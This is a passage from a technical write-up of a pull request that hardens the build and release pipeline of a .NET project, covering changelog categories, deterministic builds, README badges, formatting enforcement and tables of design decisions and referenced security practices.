```yaml
# .github/release.yml
changelog:
  categories:
    - title: Features
      labels: [enhancement]
    - title: Bug Fixes
      labels: [bug]
    - title: Dependencies
      labels: [dependencies]
    - title: Other Changes
      labels: ['*']
```

When a GitHub Release is created (via the stable release workflow's `softprops/action-gh-release`), GitHub auto-generates release notes by categorizing merged PRs since the last release. The `release.yml` configuration controls the categories. Dependabot PRs automatically get the `dependencies` label, so they appear in a dedicated section rather than cluttering the features or fixes lists.

### 10. Build Reproducibility

```xml
<!-- Directory.Build.props -->
<Deterministic>true</Deterministic>
<ContinuousIntegrationBuild Condition="'$(CI)' == 'true'">true</ContinuousIntegrationBuild>
```

#### What `Deterministic` does

By default, the C# compiler embeds non-deterministic data in assemblies: timestamps, random GUIDs, and absolute file paths. `Deterministic` eliminates all sources of non-determinism:

- **Timestamps** are set to a fixed value
- **GUIDs** are derived from content hashes instead of being random
- **File paths** in PDBs are relativized

The result: compiling the same source on two different machines produces byte-identical assemblies. This enables verifiable builds — a consumer can rebuild from source and confirm the output matches the published package.

#### What `ContinuousIntegrationBuild` does

`ContinuousIntegrationBuild` goes further for CI-produced packages: it strips local file paths from PDBs entirely, replacing them with repository-relative paths via SourceLink. Without this, a PDB built on a CI runner would contain paths like `/home/runner/work/ServiceBusToolset/src/...`. With it, the paths become `/_/src/...` (normalized) and SourceLink maps them back to the GitHub repository.

The `Condition="'$(CI)' == 'true'"` guard ensures this only applies in CI. During local development, you want actual file paths in PDBs so that debuggers can find source files.

### 11. README Badges

```markdown
[![Build](https://github.com/kyurkchyan/ServiceBusToolset/actions/workflows/alpha-release.yml/badge.svg?branch=master)]
[![Coverage](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/kyurkchyan/COVERAGE_GIST_ID/raw/coverage-badge.json)]
[![NuGet](https://img.shields.io/nuget/v/ServiceBusToolset)]
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)]
```

Four badges provide at-a-glance project health: build status (from the alpha release workflow), code coverage (from the dynamic badge gist), latest NuGet version, and license type. The coverage badge uses the shields.io endpoint pattern rather than a static badge, so it updates automatically when the alpha release workflow runs.

## How the Formatting Changes Relate

The diff includes dozens of `.cs` files with changes like:

```csharp
// Before
await receiver.PeekMessagesAsync(batchSize, cancellationToken:cancellationToken);

// After
await receiver.PeekMessagesAsync(batchSize, cancellationToken: cancellationToken);
```

These are the result of enabling `dotnet format --verify-no-changes` in the PR validation pipeline. The `.editorconfig` rule for named arguments requires a space after the colon. This was never enforced before — developers sometimes included the space and sometimes didn't. When the formatting gate was enabled, the first run surfaced ~30 inconsistencies.

These were fixed in a dedicated commit ("Formatting fixes") rather than sprinkled across unrelated changes. This keeps the git history clean: the formatting commit can be identified and excluded when reviewing the history for functional changes (using `git log --format="%H %s" | grep -v "Formatting"`).

This is a common pattern when introducing formatting enforcement to an existing codebase: the first enforcement run surfaces all pre-existing violations, which are fixed in one batch. After that, the gate prevents new violations from accumulating.

## Design Decisions

| Decision | Rationale |
|---|---|
| SHA pins with version comments | Immutable security guarantee + human readability. Dependabot updates both. |
| `env:` for all shell values | Eliminates injection even for safe values. Consistent patterns prevent inconsistent mistakes. |
| Regex validation for version input | Defense in depth — even with `env:`, validate at the boundary. |
| Unit tests before integration | Fast feedback first, expensive tests only for code that passes basic checks. |
| 60% coverage threshold | Floor, not target. Catches zero-test PRs without incentivizing low-value tests. |
| `continue-on-error` on coverage comment | Coverage comment is informational. A posting failure shouldn't fail the build. |
| `always()` on test report job | Report should show which tests failed, even when tests fail. |
| `CentralPackageTransitivePinningEnabled: false` | Direct pinning is sufficient for this project size. Transitive pinning adds maintenance burden. |
| Separate Dependabot limits (10 NuGet, 5 Actions) | NuGet has more packages and updates more frequently than Actions. |
| `paths-ignore` for docs | Documentation changes can't break the build. Save CI minutes. |
| SBOM only on stable release | Alpha releases are ephemeral. SBOM overhead is justified only for stable releases that consumers actually depend on. |
| `profile: chill` for CodeRabbit | Avoids noisy, pedantic review comments. Focus on issues that matter. |
| `request_changes_workflow: false` | AI reviewer suggests but doesn't block. Human makes the final call. |

## Industry Alignment

| Practice | Framework / Reference |
|---|---|
| SHA-pinned actions | [GitHub Security Hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions), [OpenSSF Scorecard](https://github.com/ossf/scorecard) (Pinned-Dependencies check) |
| Script injection prevention | [GitHub Actions Security Best Practices](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections) |
| Central Package Management | [NuGet CPM docs](https://learn.microsoft.com/en-us/nuget/consume-packages/central-package-management), [.NET Runtime engineering guidelines](https://github.com/dotnet/runtime/blob/main/docs/coding-guidelines/project-guidelines.md) |
| SBOM generation | [NTIA SBOM Minimum Elements](https://www.ntia.gov/page/software-bill-materials), [Executive Order 14028](https://www.whitehouse.gov/briefing-room/presidential-actions/2021/05/12/executive-order-on-improving-the-nations-cybersecurity/) |
| Automated dependency updates | [OpenSSF Best Practices Badge](https://bestpractices.coreinfrastructure.org/) (requires monitoring known vulnerabilities) |
| Least-privilege permissions | [GitHub Token Permissions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token), Principle of Least Privilege (NIST SP 800-53) |
| Vulnerability scanning in CI | [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/), [dotnet list package --vulnerable](https://learn.microsoft.com/en-us/dotnet/core/tools/dotnet-list-package) |
| Deterministic/reproducible builds | [Reproducible Builds initiative](https://reproducible-builds.org/), [.NET SourceLink](https://learn.microsoft.com/en-us/dotnet/standard/library-guidance/sourcelink) |
| Coverage gating | [Martin Fowler — Test Coverage](https://martinfowler.com/bliki/TestCoverage.html) (the floor, not the target, philosophy) |
| Concurrency control | [GitHub Actions Concurrency](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-your-workflows) |
| AI-assisted code review | [CodeRabbit](https://coderabbit.ai/) with architecture-aware context |

## File Summary

| Area | Files | Purpose |
|---|---|---|
| **New workflows** | `.github/workflows/pr-validation.yml` | Multi-stage PR quality gate |
| **Modified workflows** | `.github/workflows/alpha-release.yml` | SHA pins, test gate, coverage badge, injection fixes |
| | `.github/workflows/stable-release.yml` | SHA pins, test gate, SBOM, injection fixes |
| **Dependency governance** | `Directory.Packages.props` (new) | Central Package Management — all 27 versions |
| | `Directory.Build.props` (new) | Shared build properties (TFM, nullable, deterministic) |
| **Automation** | `.github/dependabot.yml` (new) | Weekly NuGet + Actions update PRs |
| | `.github/release.yml` (new) | Automated changelog categories |
| | `.coderabbit.yaml` (new) | AI review with architecture context |
| **Project files** | 7 `.csproj` files | Removed duplicated versions and build properties |
| **Code formatting** | ~20 `.cs` files | Named argument spacing (`cancellationToken: cancellationToken`) |
| **README** | `README.md` | Build, coverage, NuGet, and license badges |
